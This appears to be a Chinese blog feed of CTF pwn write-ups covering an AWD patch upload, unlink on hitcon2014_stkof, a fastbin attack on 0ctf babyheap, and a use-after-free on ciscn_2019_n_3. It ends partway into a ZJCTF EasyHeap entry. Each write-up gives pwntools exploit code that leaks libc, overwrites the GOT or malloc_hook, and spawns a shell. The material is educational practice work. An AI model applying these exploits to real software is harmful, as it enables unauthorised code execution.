src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225530541.bmp"></p><p><font size="4"><strong>pwn.patch就是改了之后的文件</strong>，修改pwn.patch为pwn就行了</font></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225753998.bmp"></p><ul><li>可以发现，execve系统调用被禁用了，所以原来的脚本是打不通的。</li></ul><h4 id="2-4-远程上传"><a href="#2-4-远程上传" class="headerlink" title="2.4 远程上传"></a>2.4 远程上传</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scp -P <span class="number">2222</span> filename_addr username@ip:/目录</span><br></pre></td></tr></table></figure><ul><li><p>filename_addr就是你要上传的文件绝对地址</p></li><li><p>username就是服务器地址，比如team1，ip就是ping一下你的虚拟ip然后的地址，后面目录就是你要上传到服务器的目录</p></li><li><p>做完这些是要输密码的，正常输入即可</p></li><li><p>一般我们的文件时上传到&#x2F;tmp目录下面，然后根据重定向写入到pwn文件中</p></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat /tmp/pwn &gt; <span class="regexp">/home/</span>ctf/pwn</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904230324533.bmp"></p><ul><li>做完这些pwn手可以歇息了(对于我来说也可以歇息了，因为已经不会了)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof-unlink</title>
      <link href="/2024/09/03/hitcon2014-stkof-unlink/"/>
      <url>/2024/09/03/hitcon2014-stkof-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="unlink–只有add-free-edit"><a href="#unlink–只有add-free-edit" class="headerlink" title="unlink–只有add,free,edit"></a>unlink–只有add,free,edit</h1><p><a href="https://buuoj.cn/challenges#hitcon2014_stkof">题目链接</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>unlink修改free_got，利用puts_got,puts_plt</strong></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">文章链接</a></p><h2 id="题目速览"><a href="#题目速览" class="headerlink" title="题目速览"></a>题目速览</h2><h4 id="经典堆菜单"><a href="#经典堆菜单" class="headerlink" title="经典堆菜单"></a>经典堆菜单</h4><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211652894.bmp"></p><h4 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h4><ul><li>注意先加一，才记录地址</li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211718246.bmp"></p><h4 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h4><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211711681.bmp"></p><h4 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h4><ul><li><font size="4" color="red"><strong>漏洞点，未对size检查</strong></font></li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211705331.bmp"></p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><ul><li>本题目没有后门函数，所以需要我们泄露libc</li><li>开启了PIE,且只有free,add,edit函数可以使用，正常的uaf通过unsortedbin泄露main_arena肯定不行了</li><li>但是我们还有一个unlink，以前都是修改free_got为sysem，现在我们可以将free_got修改为puts_plt，然后调用free就相当于puts_plt，将puts_got写入chunk中，就可以得到libc地址了。</li><li>然后就是正常的修改free_got为system_plt，写入&#x2F;bin&#x2F;sh，然后free就getshell了</li></ul><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h4 id="1-实现unlink"><a href="#1-实现unlink" class="headerlink" title="1.实现unlink"></a>1.实现unlink</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0x0602140</span></span><br><span class="line">bss = s + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 1 s+8</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 2 s+0x10</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">fd = bss - <span class="number">0x18</span></span><br><span class="line">bk = bss - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 2,3合并,触发unlink</span></span><br></pre></td></tr></table></figure><ul><li>bss中0x0602140是add函数中s的地址，也是存储chunk的地址，但是之前也说了，我们是先+1再储存chunk地址的，因此chunk1对应于s[1],也就是0x0602140+0x8</li><li>unlink可以使当前储存chunk的地址指向target_addr-0x18，这样改的话会出现下面情况：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s[<span class="number">2</span>]- <span class="number">0x18</span></span><br><span class="line">s[<span class="number">0</span>] -&gt; <span class="number">0x0</span></span><br><span class="line">s[<span class="number">1</span>] -&gt; chunk1_user_data</span><br><span class="line">s[<span class="number">2</span>] -&gt; s[<span class="number">2</span>]<span class="number">-0x18</span> </span><br></pre></td></tr></table></figure><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903214034468.bmp"></p><h4 id="2-修改free-got为puts-plt，泄露libc"><a href="#2-修改free-got为puts-plt，泄露libc" class="headerlink" title="2.修改free_got为puts_plt，泄露libc"></a>2.修改free_got为puts_plt，泄露libc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat( [ cyclic(<span class="number">0x10</span>), free_got, puts_got] )</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address: &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><font size="4"><strong>第一个payload:</strong></font></li></ul><p>修改chunk2，其实相当于修改 s-0x18地址的值，修改的是画框部分：</p><p>修改可以参考非栈上格式化字符串所说的A -&gt;B -&gt;C,修改A其实是修改C。</p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/1.bmp"></p><p>往下写0x10垃圾数据，然后填写free_got,puts_got，那么就会出现下面情况：</p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903214655504.bmp"></p><p><font size="4" color="red">这里一定要记住got@plt会自动的指向plt表，也就是说，修改got表到A-B这样的地址结构的时候，会形成A-&gt;GOT@plt-&gt;plt，这样三地址结构，所以我们再次修改A地址为plt才会成功。</font></p><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903215051485.bmp"></p><p>成功修改，然后free(2)，2处存储的是puts_plt的地址。</p><h4 id="3-修改free-got为system-然后getshell"><a href="#3-修改free-got为system-然后getshell" class="headerlink" title="3.修改free_got为system,然后getshell"></a>3.修改free_got为system,然后getshell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>没什么说的，和之前一样的。</li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903215311365.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_2017_babyheap--fastbin_attack</title>
      <link href="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/"/>
      <url>/2024/09/03/0ctf-2017-babyheap-fastbin-attack/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p><a href="https://buuoj.cn/challenges#0ctf_2017_babyheap">题目链接</a></p><p><a href="https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so">libc.so文件链接</a></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><ul><li><font coloe="red">glibc2.24 <strong>fastbin_attack</strong>, <strong>unsortedbin泄露main_arena</strong> ,<strong>Arbitrary Alloc</strong></font></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">Fastbin Attack - CTF Wiki (ctf-wiki.org)</a></li></ul><h2 id="题目速览："><a href="#题目速览：" class="headerlink" title="题目速览："></a>题目速览：</h2><ul><li><h5 id="典型的堆菜单题目，但是没有后门函数，system函数也没有"><a href="#典型的堆菜单题目，但是没有后门函数，system函数也没有" class="headerlink" title="典型的堆菜单题目，但是没有后门函数，system函数也没有"></a>典型的堆菜单题目，但是没有后门函数，system函数也没有</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134306228.bmp"></p><ul><li><h5 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134348584.bmp"></p><ul><li><h5 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134416635.bmp"></p><ul><li><h5 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134451923.bmp"></p><ul><li><h5 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h5></li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903134503547.bmp"></p><h3 id="思路分析："><a href="#思路分析：" class="headerlink" title="思路分析："></a>思路分析：</h3><ul><li><strong>漏洞点在edit函数，未对size检查，可以实现任意地址写</strong></li><li>题目开启了PIE,unlink直接out，所以想到fastbin_attack,修改malloc_hook为onegagdet。</li><li>先通过unsortedbin泄露main_arena，即可以得到malloc_hook(相差0x10), arbitrary_alloc错位构造fake_chunk，就可以修改malloc_hook为one_gadget</li><li>但是运用arbitrary_alloc需要uaf修改fastbin中chunk的fd指针，因此需要我们两个地址控制同一个chunk，这个手法看下面调试吧。</li></ul><h2 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glibc2.24,泄漏libc,修改__malloc_hook为onegadget</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x00 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x20 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x40 2 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x60 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0x80 4 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fastbins 1-&gt;2</span></span><br></pre></td></tr></table></figure><ul><li>构造五个chunk，chunk0用来溢出chunk1，chunk1，2用于uaf，chunk4用来泄露libc，chunk3溢出修改chunk4</li><li>查看堆布局，看看如何使得两个地址共同控制一个chunk：</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903162751498.bmp"></p><ul><li>由于内存的分页管理机制，我们第一次分配堆地址的最后三位十六进制数肯定为000</li><li>此时我们溢出chunk0修改chunk1的fd指针，也就相当于修改chunk2的地址，此时我们需要利用chunk4,如果将1-&gt;fd所指向的chunk2的地址最后一字节修改为0x80，也就是1-&gt;fd &#x3D; chunk4,此时chunk2会和chunk4联系起来，即<strong>修改chunk2也会修改chunk4</strong>，<strong>也就做到了uaf的利用</strong></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  4--2</span></span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>虽然已经将1-&gt;fd -&gt; 4 ,4和2联系起来了，但是此时的chunk4放在fastbin中肯定是不合适的，因为size不同，在分配chunk的时候size不同是会报错的，所以我们要修改chunk4的size，和chunk1保持一致(在同一个bin中)</li><li>然后将1，2都回收回来，注意虽然1-&gt;fd修改为了chunk4,但是add的函数中for循环从小到大，只要满足”标志位”是0就分配，而chunk2的标志位free之后始终为0。</li><li>然后将chunk4的size修改回来，free(4)，4的fd和bk指针将指向main_arena+0x58,show(2)就将输出这个特殊地址，因为chunk2和chunk4都是指向chunk4的。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 因为2的指针=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 防止和topchunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hook和main_arena差了0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903165642200.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>Arbitrary Alloc 构造fake_chunk</li></ul><p>技巧可以看开头的文章，这里直接演示。</p><ul><li>为了修改malloc_hook为one_gadget，我们要往malloc_hook上面构造fake_chunk，然后直接修改堆中内容即可，来看看malloc_hook上面又没有地方构造吧：</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903170254157.bmp"></p><ul><li>我们发现这个地方可以错位出一个size出来，对应于fastbin[5]（不是很懂可以看开头文章)，这个错位出来的chunk的size是0x60，为了使fastbin中已经存在的chunk-&gt;fd链接上fake_chunk，其size也应该是0x60</li><li>该chunk的地址可以从图上看出：malloc_hook-0x13-0x8(size)-0x8(prev_size)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.23-0ubuntu11.2_amd64.so&quot;</span>)</span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 构造一个位于fastbin的chunk</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 修改chunk2=修改chunk4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6 -&gt; fake_chunk</span></span><br></pre></td></tr></table></figure><ul><li>下图可以发现修改chunk2其实也修改了chunk4</li></ul><p><img src="/2024/09/03/0ctf-2017-babyheap-fastbin-attack/capture_20240903171316211.bmp"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><ul><li>然后就很简单了，修改malloc_hook-&gt;one_gadget，再次malloc即可。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x13</span>) + p64(onegadget) <span class="comment"># 从上图看偏移即可</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul><li><p>之前有几次出现了“timeout: the monitored command dumped core”</p></li><li><p>可以看看<a href="https://blog.csdn.net/Lcw_linyx/article/details/124311578">这篇文章</a></p></li><li><p>其实还有一种情况(我也不知道算不算)，我修改了libc.so文件就过了</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_3-uaf</title>
      <link href="/2024/09/02/ciscn-2019-n-3-uaf/"/>
      <url>/2024/09/02/ciscn-2019-n-3-uaf/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-n-3-32位uaf"><a href="#ciscn-2019-n-3-32位uaf" class="headerlink" title="ciscn_2019_n_3(32位uaf)"></a>ciscn_2019_n_3(32位uaf)</h1><p><font size="4"><a href="https://buuoj.cn/challenges#ciscn_2019_n_3">题目链接</a></font></p><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124827761.bmp"></p><ul><li>又是典型的堆菜单题目，但是注意此题是32位的，接着看各个功能块：</li></ul><p><font size="4"><strong>do_new</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124929281.bmp"></p><p><font size="4"><strong>do_del</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124936477.bmp"></p><p><font size="4"><strong>do_dump</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124944351.bmp"></p><p><font size="4"><strong>ask</strong></font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902124950987.bmp"></p><h3 id="1-1功能块分析"><a href="#1-1功能块分析" class="headerlink" title="1.1功能块分析"></a>1.1功能块分析</h3><ul><li>do_new里面是生成两个chunk(type&#x3D;2)，注意其中第一个chunk，malloc(0xc)，<strong>对于32位来说，他是0x8+0x4，这样malloc的chunk涉及到了prev_size的复用</strong>，下一个chunk的prev_size将会充当上一个chunk的user_data部分，因为prev_size记录上一个chunk是否被利用，没利用记作0，空着不用太浪费了就会被利用，**对应于64位，malloc(0xn0 + 0x8)**。</li><li>prev_size的复用通常会用于off_by_one漏洞利用，但这里没有off_by_one</li><li>do_new中的chunk结构如下：</li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/heap.drawio.png"></p><p><font size="4" color="red">漏洞点就在rec_int_free和do_del里面：</font></p><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902130932374.bmp"></p><p><em><em>do_del以地址执行函数，</em>(record[i]+4)对应的就是rec_int_free函数，record[i]就是指针参数。</em>*</p><ul><li>思路应该很清晰了,和之前一样的，修改free_got -&gt; system_plt，然后往record[i]传入&#x2F;bin&#x2F;sh\x00，进行do_del,就可以getshell，但是此题有点区别，<strong>由于是32位，&#x2F;bin&#x2F;sh\x00有8字节，一个机器字长无法写下，其实这里写入sh\x00\x00也可以getshell。</strong></li><li>如何修改，这里利用了<font color="red"><strong>uaf。</strong></font></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">add</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,b<span class="string">&#x27;bbbb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902131659259.bmp"></p><ul><li><strong>查看堆布局可以明显看出prev_size的复用</strong></li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>接着我们free掉0，1，那么这四个chunk都会被free掉，进入fastbins中，然而，free之后它们的指针并未清零，这里就造成了uaf漏洞</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132413024.bmp"></p><ul><li>我们再次malloc，首先就会malloc(0xc)，将record[1]malloc(0xc)给拿走，我们的目的就是修改record处的地址，<strong>那么我们再次malloc(0xc)，系统会将record[0]malloc(0xc)给你，那么我们修改这部分的内容了</strong></li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132856868.bmp"></p><ul><li><font size="4" color="red">下图可以发现record[0]发生了改变</font></li></ul><p><img src="/2024/09/02/ciscn-2019-n-3-uaf/capture_20240902132909502.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>此时我们free(0)就可以getshell了</li></ul><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27447)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,<span class="built_in">type</span>,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Type &gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>) )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Length &gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 思路uaf,double_free修改free_got -&gt; system_plt</span></span><br><span class="line"><span class="comment"># 注意32位</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free指针不清零,record[idx]依然有数值</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbins 0x10 1-&gt;0</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">b&#x27;sh\x00\x00&#x27;</span>+p32(system_plt))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF_2019_EasyHeap-unlink</title>
      <link href="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/"/>
      <url>/2024/09/01/ZJCTF-2019-EasyHeap-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF-2019-EasyHeap-unlink"><a href="#ZJCTF-2019-EasyHeap-unlink" class="headerlink" title="[ZJCTF_2019]EasyHeap-unlink"></a>[ZJCTF_2019]EasyHeap-unlink</h1><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">题目链接</a></p><h2 id="初次分析"><a href="#初次分析" class="headerlink" title="初次分析"></a>初次分析</h2><ul><li>刚开始ida一看，以为和之前的题目一样，就是简单的修改unsortedbin-&gt;bk，然后getflag</li><li>之前的题目讲解：[BUUCTF hitcontraining_magicheap–<a href="https://blog.csdn.net/zwb2603096342/article/details/140345550?spm=1001.2014.3001.5502">Unsorted_bin-＞bk修改]3-CSDN博客</a></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901201439897.bmp"></p><ul><li><font size="4"><strong>l33r是个后门函数</strong></font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901202058454.bmp"></p><ul><li>正常打结果却显示：</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901193853555.bmp"></p><ul><li><font size="4" color="red">所以被后门函数欺骗了！！！</font></li></ul><h2 id="正式分析"><a href="#正式分析" class="headerlink" title="正式分析"></a>正式分析</h2><p>各个功能块就不展示了，可以看开头的博客。</p><ul><li>给了后门函数不可以用，但是提供了systen函数，我们要做的就是往里面传参，与上一篇博客可以说很相似了，<font color="red">先传入&#x2F;bin&#x2F;sh,修改free_got为system_plt,执行free即可</font></li><li>那么如何修改free_got，为了实现这个功能，我们通常有double_free控制同一个chunk，但是这里free后将指针清零了，所以无疑是不可以的，那么我们可以采取unlink，关于unlink可以参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#unlink_2">这篇文章</a></li><li>此题的PIE也没有开，且具有heaparray地址：</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901202849993.bmp"></p><p><font size="4">常规的：</font></p><ul><li><font size="4"><strong>fd -&gt;  heaparray-0x18</strong></font></li><li><font size="4"><strong>bk -&gt; heaparray-0x10</strong></font></li></ul><p><font size="4">还有修改谁的fd，bk跟着gdb调试理解吧</font></p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span 